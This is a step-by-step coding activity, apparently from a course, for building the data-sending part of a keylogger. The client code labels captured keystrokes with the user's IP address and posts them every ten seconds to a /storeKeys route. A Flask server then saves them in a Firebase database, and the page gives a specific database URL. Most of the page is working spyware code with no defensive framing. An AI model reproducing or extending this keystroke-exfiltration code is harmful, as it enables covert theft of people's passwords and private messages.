Store the Key Values
======================
In this activity, you will code to store the text generated by the keylogger in the database.


<img src= "https://s3.amazonaws.com/media-p.slid.es/uploads/2071954/images/10989230/Slide_9.gif" width = "100%" height = "50%">




Follow the given steps to complete this activity.




1. Send the keylogger data to the server on `storeKeys` route.
   * Open the file `main.py`.
   * Define global variable `time_interval` and assign it time interval in seconds after which the keylogger data will be sent to the server.
    ```
    time_interval = 10
    ```
2. Define `sendPostReq()` function that sends data to the server
   * Define `sendPostReq()` function and access global `text` variable.    
    ```
    def sendPostReq():
        global text
    ```
    * Add a`try` block where data will be sent to the server.
    * Use a boilerplate function `get_ip_address()` to get the IP address of the user.
    ```
        try:
            ip_address = get_ip_address()
            print("Computer IP Address is:" + (ip_address))
    ```
    * Replace '.' with '-' in the IP address so that it can be converted to JSON without any problem.
    ```    
            ip_address = ip_address.replace(".", "-")
    ```
    * Create `data` as a dict that stores `text` variable at key `ip_address` then convert the `data` to JSON to create the `payload`.
    ```
            data = {ip_address: text}
            payload = json.dumps(data)
    ```
    * Create a POST request to the address. **http://localhost:port/storeKeys**
    ```
            r = requests.post(f"http://{localhost}:{port_number}/storeKeys",
                            data=payload, headers={"Content-Type": "application/json"})
    ```
    * Set up a timer function to run every `time_interval` specified in seconds. `sendPostReq` is a recursive function, and will call itself as long as the program is running.
    ```
            timer = threading.Timer(time_interval, sendPostReq)
            timer.start()
    ```
    * Print error message in the except block.
    ```
        except:
            print("Couldn't complete request!")
    ```
3. Call `sendPostReq()` function inside the key event listener to start sending the data.


```
sendPostReq()
```


4. Create the path `'/storeKeys'` at the server that stores data in the database.
   * Open `app.py` file
   * Replace database Url and credentials in the boilerplate code.
    ```
    def firebaseInitialization():
        cred = credentials.Certificate("config/serviceAccountKey.json")
        firebase_admin.initialize_app(
        cred, {'databaseURL': 'https://keylogger-7820c-default-rtdb.firebaseio.com'})
        print("ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Firebase Connected! ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥")


    ```
   * Create a route `'/storeKeys'` to save the JSON data in the database
     * Create a route `'/storeKeys'` and read JSON data from the request.
 
        ```
        @app.route('/storeKeys', methods=["POST"])
        def storeKeys():
            keyValues = request.get_json()
        ```
     * Check if `/keyboardData` is in the database if not then create and add the data.
        ```
            ref = db.reference("/keyboardData").get()
            if (ref):
                    ref = db.reference("/keyboardData")
                    ref.update(keyValues)
            else:
                ref = db.reference("/")
                ref.set({"keyboardData": keyValues})
        ```
     * Return `True` as response to show that data is successfully updated.
        ```
            return jsonify(True)
        ```


Save and run the code to check the output.
